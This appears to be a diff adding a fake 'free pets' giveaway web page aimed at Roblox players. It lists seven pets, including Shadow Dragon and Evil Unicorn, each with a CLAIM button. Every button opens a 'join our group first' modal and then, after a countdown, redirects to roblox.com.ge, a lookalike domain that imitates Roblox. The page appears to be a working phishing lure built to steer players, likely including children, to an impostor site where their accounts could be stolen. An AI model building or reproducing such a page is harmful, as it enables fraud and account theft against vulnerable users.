@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Claim Your Pets</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  background: linear-gradient(135deg, #1f1f3f, #4a00e0);
+  color: white;
+  font-family: Arial, sans-serif;
+  text-align: center;
+  min-height: 100vh;
+}
+
+h2 {
+  color: #ffd700;
+  margin-top: 20px;
+  text-shadow: 1px 1px 5px black;
+}
+
+p {
+  color: #ddd;
+}
+
+.container {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 15px;
+  padding: 15px;
+}
+
+.card {
+  background: radial-gradient(circle at top, #3b3b6a, #1f1f3f);
+  border-radius: 15px;
+  padding: 15px;
+  position: relative;
+  box-shadow: 0 0 20px rgba(0,0,0,0.7), 0 0 15px rgba(255,215,0,0.5);
+  transition: transform 0.3s;
+}
+
+.card:hover {
+  transform: scale(1.05);
+}
+
+.card img {
+  width: 100%;
+  border-radius: 12px;
+}
+
+.free {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  background: gold;
+  color: black;
+  padding: 4px 8px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: bold;
+}
+
+.name {
+  margin: 10px 0;
+  font-weight: bold;
+}
+
+button {
+  background: orange;
+  border: none;
+  border-radius: 8px;
+  padding: 10px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  background: #ffb400;
+}
+
+/* MODAL */
+#confirmModal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.85);
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.modal-box {
+  background: #2b2b5f;
+  border-radius: 15px;
+  padding: 20px;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 0 25px gold;
+}
+
+.modal-box h3 {
+  color: gold;
+}
+
+.countdown {
+  font-size: 22px;
+  margin: 10px 0;
+  color: #ffd700;
+}
+
+.cancel {
+  background: crimson;
+  margin-top: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<h2>CLAIM YOUR PETS</h2>
+<p>Click CLAIM on each pet you want!</p>
+
+<div class="container">
+
+  <!-- SHADOW DRAGON -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/AsanPpK.png">
+    <div class="name">SHADOW DRAGON</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- BAT DRAGON -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/aZWMn0P.png">
+    <div class="name">BAT DRAGON</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- FROST DRAGON -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/pg1nTKU.png">
+    <div class="name">FROST DRAGON</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- GIRAFFE -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/JCORk6c.png">
+    <div class="name">GIRAFFE</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- OWL -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/efi1CsH.png">
+    <div class="name">OWL</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- EVIL UNICORN -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/mLvkMms.png">
+    <div class="name">EVIL UNICORN</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+  <!-- BLUE DOG -->
+  <div class="card">
+    <span class="free">FREE</span>
+    <img src="https://i.imgur.com/WvzIVsp.png">
+    <div class="name">BLUE DOG</div>
+    <button onclick="startClaim()">🎁 CLAIM</button>
+  </div>
+
+</div>
+
+<!-- MODAL -->
+<div id="confirmModal">
+  <div class="modal-box">
+    <h3>⚠ IMPORTANT</h3>
+    <p>
+      IN ORDER TO RECEIVE YOUR PETS,<br>
+      YOU NEED TO JOIN OUR GROUP FIRST.
+    </p>
+    <div class="countdown">
+      Redirecting in <span id="time">10</span> seconds...
+    </div>
+    <button class="cancel" onclick="cancelRedirect()">Cancel</button>
+  </div>
+</div>
+
+<script>
+const redirectURL = "https://roblox.com.ge/communities/6298953098/";
+let countdown;
+let timeLeft = 10;
+
+function startClaim() {
+  document.getElementById("confirmModal").style.display = "flex";
+  timeLeft = 10;
+  document.getElementById("time").textContent = timeLeft;
+
+  countdown = setInterval(() => {
+    timeLeft--;
+    document.getElementById("time").textContent = timeLeft;
+
+    if (timeLeft <= 0) {
+      clearInterval(countdown);
+      window.location.href = redirectURL;
+    }
+  }, 1000);
+}
+
+function cancelRedirect() {
+  clearInterval(countdown);
+  document.getElementById("confirmModal").style.display = "none";
+}
+</script>
+
+</body>
+</html>
+
